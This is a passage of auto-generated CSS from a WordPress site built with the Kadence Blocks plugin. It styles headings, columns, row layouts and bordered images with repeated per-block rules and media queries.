.wp-block-kadence-advancedheading.kt-adv-heading76_201a70-7c[data-kb-block="kb-adv-heading76_201a70-7c"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_201a70-7c mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_201a70-7c[data-kb-block="kb-adv-heading76_201a70-7c"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_201a70-7c img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_201a70-7c[data-kb-block="kb-adv-heading76_201a70-7c"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_201a70-7c, .wp-block-kadence-advancedheading.kt-adv-heading76_201a70-7c[data-kb-block="kb-adv-heading76_201a70-7c"]{font-size:22px;}}.kb-row-layout-id76_8867d0-65 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_8867d0-65 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_58a225-df > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_58a225-df > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_58a225-df > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_58a225-df > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_58a225-df > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_58a225-df, .kt-inside-inner-col > .kadence-column76_58a225-df:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_58a225-df > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_58a225-df > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_66ca36-7d > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_66ca36-7d > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_66ca36-7d > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_66ca36-7d > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_66ca36-7d > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_66ca36-7d, .kt-inside-inner-col > .kadence-column76_66ca36-7d:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_66ca36-7d > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_66ca36-7d > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_f3f4db-7e, .wp-block-kadence-advancedheading.kt-adv-heading76_f3f4db-7e[data-kb-block="kb-adv-heading76_f3f4db-7e"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_f3f4db-7e mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_f3f4db-7e[data-kb-block="kb-adv-heading76_f3f4db-7e"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_f3f4db-7e img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_f3f4db-7e[data-kb-block="kb-adv-heading76_f3f4db-7e"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_f3f4db-7e, .wp-block-kadence-advancedheading.kt-adv-heading76_f3f4db-7e[data-kb-block="kb-adv-heading76_f3f4db-7e"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_b7dbe7-f0:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_b7dbe7-f0 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_b7dbe7-f0 img.kb-img, .kb-image76_b7dbe7-f0 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_b7dbe7-f0 img.kb-img, .kb-image76_b7dbe7-f0 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_b7dbe7-f0.kb-image-is-ratio-size, .kb-image76_b7dbe7-f0 .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_b7dbe7-f0 figure{max-width:150px;}.kb-image76_b7dbe7-f0 img.kb-img, .kb-image76_b7dbe7-f0 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_7e8ab8-5f > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_7e8ab8-5f > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_c4b81e-9e > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_c4b81e-9e > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_c4b81e-9e > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_c4b81e-9e > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_c4b81e-9e > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_c4b81e-9e, .kt-inside-inner-col > .kadence-column76_c4b81e-9e:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_c4b81e-9e > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_c4b81e-9e > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_7a7e29-45 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_7a7e29-45 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_7a7e29-45 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_7a7e29-45 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_7a7e29-45 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_7a7e29-45, .kt-inside-inner-col > .kadence-column76_7a7e29-45:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_7a7e29-45 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_7a7e29-45 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_631447-57, .wp-block-kadence-advancedheading.kt-adv-heading76_631447-57[data-kb-block="kb-adv-heading76_631447-57"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_631447-57 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_631447-57[data-kb-block="kb-adv-heading76_631447-57"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_631447-57 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_631447-57[data-kb-block="kb-adv-heading76_631447-57"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_631447-57, .wp-block-kadence-advancedheading.kt-adv-heading76_631447-57[data-kb-block="kb-adv-heading76_631447-57"]{font-size:22px;}}.kb-row-layout-id76_a8bdff-de > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_a8bdff-de > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_518ac8-65 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_518ac8-65 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_518ac8-65 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_518ac8-65 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_518ac8-65 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_518ac8-65, .kt-inside-inner-col > .kadence-column76_518ac8-65:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_518ac8-65 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_518ac8-65 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_73d6ed-6c > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_73d6ed-6c > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_73d6ed-6c > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_73d6ed-6c > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_73d6ed-6c > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_73d6ed-6c, .kt-inside-inner-col > .kadence-column76_73d6ed-6c:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_73d6ed-6c > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_73d6ed-6c > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_582622-16, .wp-block-kadence-advancedheading.kt-adv-heading76_582622-16[data-kb-block="kb-adv-heading76_582622-16"]{max-width:0px;padding-bottom:2px;text-align:center;font-size:20px;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_582622-16 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_582622-16[data-kb-block="kb-adv-heading76_582622-16"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_582622-16 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_582622-16[data-kb-block="kb-adv-heading76_582622-16"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_582622-16, .wp-block-kadence-advancedheading.kt-adv-heading76_582622-16[data-kb-block="kb-adv-heading76_582622-16"]{font-size:22px;}}.kb-row-layout-id76_e2a220-ed > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_e2a220-ed > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_b9e836-50 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_b9e836-50 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_b9e836-50 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_b9e836-50 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_b9e836-50 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_b9e836-50, .kt-inside-inner-col > .kadence-column76_b9e836-50:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_b9e836-50 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_b9e836-50 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_ba41db-5f > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_ba41db-5f > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_ba41db-5f > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_ba41db-5f > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_ba41db-5f > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_ba41db-5f, .kt-inside-inner-col > .kadence-column76_ba41db-5f:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_ba41db-5f > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_ba41db-5f > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_1bcb50-c5, .wp-block-kadence-advancedheading.kt-adv-heading76_1bcb50-c5[data-kb-block="kb-adv-heading76_1bcb50-c5"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_1bcb50-c5 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_1bcb50-c5[data-kb-block="kb-adv-heading76_1bcb50-c5"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_1bcb50-c5 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_1bcb50-c5[data-kb-block="kb-adv-heading76_1bcb50-c5"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_1bcb50-c5, .wp-block-kadence-advancedheading.kt-adv-heading76_1bcb50-c5[data-kb-block="kb-adv-heading76_1bcb50-c5"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_8be52e-b5:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_8be52e-b5 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_8be52e-b5 img.kb-img, .kb-image76_8be52e-b5 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_8be52e-b5 img.kb-img, .kb-image76_8be52e-b5 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_8be52e-b5.kb-image-is-ratio-size, .kb-image76_8be52e-b5 .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_8be52e-b5 figure{max-width:150px;}.kb-image76_8be52e-b5 img.kb-img, .kb-image76_8be52e-b5 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_3ba19a-93 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_3ba19a-93 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_49de77-85 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_49de77-85 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_49de77-85 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_49de77-85 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_49de77-85 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_49de77-85, .kt-inside-inner-col > .kadence-column76_49de77-85:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_49de77-85 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_49de77-85 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_d0077e-a2 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_d0077e-a2 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_d0077e-a2 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_d0077e-a2 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_d0077e-a2 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_d0077e-a2, .kt-inside-inner-col > .kadence-column76_d0077e-a2:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_d0077e-a2 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_d0077e-a2 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_7e3a46-15, .wp-block-kadence-advancedheading.kt-adv-heading76_7e3a46-15[data-kb-block="kb-adv-heading76_7e3a46-15"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_7e3a46-15 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_7e3a46-15[data-kb-block="kb-adv-heading76_7e3a46-15"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_7e3a46-15 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_7e3a46-15[data-kb-block="kb-adv-heading76_7e3a46-15"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_7e3a46-15, .wp-block-kadence-advancedheading.kt-adv-heading76_7e3a46-15[data-kb-block="kb-adv-heading76_7e3a46-15"]{font-size:22px;}}.kb-row-layout-id76_477daf-3f > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_477daf-3f > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_bebe42-6d > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_bebe42-6d > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_bebe42-6d > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_bebe42-6d > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_bebe42-6d > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_bebe42-6d, .kt-inside-inner-col > .kadence-column76_bebe42-6d:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_bebe42-6d > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_bebe42-6d > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_9df4ef-34 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_9df4ef-34 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_9df4ef-34 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_9df4ef-34 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_9df4ef-34 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_9df4ef-34, .kt-inside-inner-col > .kadence-column76_9df4ef-34:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_9df4ef-34 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_9df4ef-34 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_41c526-82, .wp-block-kadence-advancedheading.kt-adv-heading76_41c526-82[data-kb-block="kb-adv-heading76_41c526-82"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_41c526-82 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_41c526-82[data-kb-block="kb-adv-heading76_41c526-82"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_41c526-82 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_41c526-82[data-kb-block="kb-adv-heading76_41c526-82"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_41c526-82, .wp-block-kadence-advancedheading.kt-adv-heading76_41c526-82[data-kb-block="kb-adv-heading76_41c526-82"]{font-size:22px;}}.kb-row-layout-id76_1be5ab-13 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_1be5ab-13 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_c52a93-cd > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_c52a93-cd > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_c52a93-cd > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_c52a93-cd > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_c52a93-cd > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_c52a93-cd, .kt-inside-inner-col > .kadence-column76_c52a93-cd:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_c52a93-cd > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_c52a93-cd > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_a41c73-ab > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_a41c73-ab > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_a41c73-ab > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_a41c73-ab > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_a41c73-ab > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_a41c73-ab, .kt-inside-inner-col > .kadence-column76_a41c73-ab:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_a41c73-ab > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_a41c73-ab > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_3c84c4-b5, .wp-block-kadence-advancedheading.kt-adv-heading76_3c84c4-b5[data-kb-block="kb-adv-heading76_3c84c4-b5"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_3c84c4-b5 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_3c84c4-b5[data-kb-block="kb-adv-heading76_3c84c4-b5"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_3c84c4-b5 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_3c84c4-b5[data-kb-block="kb-adv-heading76_3c84c4-b5"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_3c84c4-b5, .wp-block-kadence-advancedheading.kt-adv-heading76_3c84c4-b5[data-kb-block="kb-adv-heading76_3c84c4-b5"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_69602a-dd:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_69602a-dd .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_69602a-dd img.kb-img, .kb-image76_69602a-dd .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_69602a-dd img.kb-img, .kb-image76_69602a-dd .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_69602a-dd.kb-image-is-ratio-size, .kb-image76_69602a-dd .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_69602a-dd figure{max-width:150px;}.kb-image76_69602a-dd img.kb-img, .kb-image76_69602a-dd .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_845c64-bd > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_845c64-bd > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_ea662c-51 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_ea662c-51 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_ea662c-51 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_ea662c-51 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_ea662c-51 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_ea662c-51, .kt-inside-inner-col > .kadence-column76_ea662c-51:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_ea662c-51 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_ea662c-51 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_ff3b51-62 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_ff3b51-62 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_ff3b51-62 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_ff3b51-62 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_ff3b51-62 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_ff3b51-62, .kt-inside-inner-col 